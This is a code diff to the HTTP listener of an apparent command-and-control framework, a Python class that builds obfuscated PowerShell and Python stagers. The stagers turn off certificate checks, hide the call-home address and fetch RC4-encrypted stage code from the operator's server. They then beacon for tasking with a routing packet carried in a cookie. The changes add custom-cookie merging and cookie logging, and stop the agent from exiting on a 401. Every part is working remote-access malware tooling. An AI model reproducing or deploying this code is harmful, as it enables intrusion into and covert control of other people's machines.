@@ -295,7 +295,7 @@ class Listener:
 
             if language.startswith('po'):
                 # PowerShell
-
+                
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
@@ -343,12 +343,8 @@ class Listener:
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 if userAgent.lower() != 'none':
-                    stager += helpers.randomize_capitalization('$wc.Headers.Add(')
+                    stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
                     stager += "'User-Agent',$u);"
-
-                    if userAgent.lower() != 'none':
-                        stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
-                        stager += "'User-Agent',$u);"
 
                     if proxy.lower() != 'none':
                         if proxy.lower() == 'default':
@@ -402,7 +398,8 @@ class Listener:
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-
+                cookieString = "{}={};".format(cookie, b64RoutingPacket)
+                
                 #Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -413,12 +410,16 @@ class Listener:
                         if headerKey.lower() == "host":
                             stager += helpers.randomize_capitalization("try{$ig=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser)}catch{};")
 
+                        if headerKey.lower() == "cookie":
+                            cookieString += "{};".format(headerValue)
+                            continue
+
                         stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
-                stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket)
+                stager += "\"Cookie\",\"%s\");" % (cookieString)
 
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
@@ -470,15 +471,23 @@ class Listener:
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie,b64RoutingPacket)
+                cookieString = "{}={};".format(cookie,b64RoutingPacket)
+                
 
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
+
+                        if headerKey.lower() == "cookie":
+                            cookieString += "{};".format(headerValue)
+                            continue
+
                         #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                         launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
+                
+                launcherBase += "req.add_header('Cookie',\"%s\");\n" % (cookieString)
 
 
                 if proxy.lower() != "none":
@@ -739,6 +748,20 @@ class Listener:
         This is so agents can easily be dynamically updated for the new listener.
         """
 
+        profile = listenerOptions['DefaultProfile']['Value']
+        customHeaders = profile.split('|')[2:]
+        cookieString = ""
+
+        if customHeaders != []:
+            for header in customHeaders:
+                headerKey = header.split(':')[0]
+                headerValue = header.split(':')[1]
+
+                if headerKey.lower() == "cookie":
+                    cookieString += "{};".format(headerValue)
+                    
+        cookie = listenerOptions['Cookie']['Value']
+
         if language:
             if language.lower() == 'powershell':
 
@@ -760,6 +783,13 @@ class Listener:
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
+                                #if there is an additional custom cookie value, add it to the webclient object.
+                                if($script:Headers['Cookie'] -ne $null) {
+                                    $cookieValueString = "$RoutingCookie;$($script:Headers['Cookie']);"
+                                }
+                                else {
+                                    $cookieValueString = $RoutingCookie
+                                }
                                 # build the web request object
                                 $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
@@ -772,8 +802,9 @@ class Listener:
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                                 $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
-
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Set("Cookie",\"""" + cookie + """=$cookieValueString")
+                                
+                                
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
                                 $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
@@ -814,7 +845,6 @@ class Listener:
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
                                 $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-
                                 try {
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random
@@ -831,7 +861,7 @@ class Listener:
                         }
                     }
                 """
-
+                
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == 'python':
@@ -864,7 +894,7 @@ def send_message(packets=None):
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = \"""" + self.session_cookie + """=%s" % (b64routingPacket)
+        headers['Cookie'] = \"""" + cookie + """=%s;{}" % (b64routingPacket)
 
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
@@ -878,7 +908,7 @@ def send_message(packets=None):
         missedCheckins = missedCheckins + 1
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
-            sys.exit(0)
+            pass
 
         return (HTTPError.code, '')
 
@@ -888,7 +918,7 @@ def send_message(packets=None):
         return (URLerror.reason, '')
 
     return ('', '')
-"""
+""".format(cookieString)
                 return updateServers + sendMessage
 
             else:
@@ -912,6 +942,7 @@ def send_message(packets=None):
         bindIP = listenerOptions['BindIP']['Value']
         host = listenerOptions['Host']['Value']
         port = listenerOptions['Port']['Value']
+        session_cookie = listenerOptions['Cookie']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
         stagerURI = listenerOptions['StagerURI']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -1013,7 +1044,7 @@ def send_message(packets=None):
                 try:
                     # see if we can extract the 'routing packet' from the specified cookie location
                     # NOTE: this can be easily moved to a paramter, another cookie value, etc.
-                    if self.session_cookie in cookie:
+                    if session_cookie in cookie:
                         listenerName = self.options['Name']['Value']
                         message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
                         signal = json.dumps({
@@ -1023,11 +1054,17 @@ def send_message(packets=None):
                         dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                         cookieParts = cookie.split(';')
                         for part in cookieParts:
-                            if part.startswith(self.session_cookie):
+                            if part.startswith(session_cookie):
                                 base64RoutingPacket = part[part.find('=')+1:]
                                 # decode the routing packet base64 value in the cookie
                                 routingPacket = base64.b64decode(base64RoutingPacket)
                 except Exception as e:
+                    message = "[*] Failed to obtain routing packet: {}".format(str(e))
+                    signal = json.dumps({
+                        'print': False,
+                        'message': message
+                    })
+                    dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                     routingPacket = None
                     pass
 
@@ -1111,6 +1148,30 @@ def send_message(packets=None):
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+
+            listenerName = self.options['Name']['Value']
+            try:
+                cookie = request.headers.get('Cookie')
+                if cookie and cookie != '':
+
+                    # see if we can extract the 'routing packet' from the specified cookie location
+                    # NOTE: this can be easily moved to a paramter, another cookie value, etc.
+                    
+                    message = "[*] POST cookie value from {} : {}".format(clientIP, cookie)
+                    signal = json.dumps({
+                        'print': False,
+                        'message': message
+                    })
+                    dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+                
+            except Exception as e:
+                
+                message = "[!] Error retrieving cookie value from {}: {}".format(clientIP, e)
+                signal = json.dumps({
+                    'print': False,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
 
             # the routing packet should be at the front of the binary request.data
             #   NOTE: this can also go into a cookie/etc.
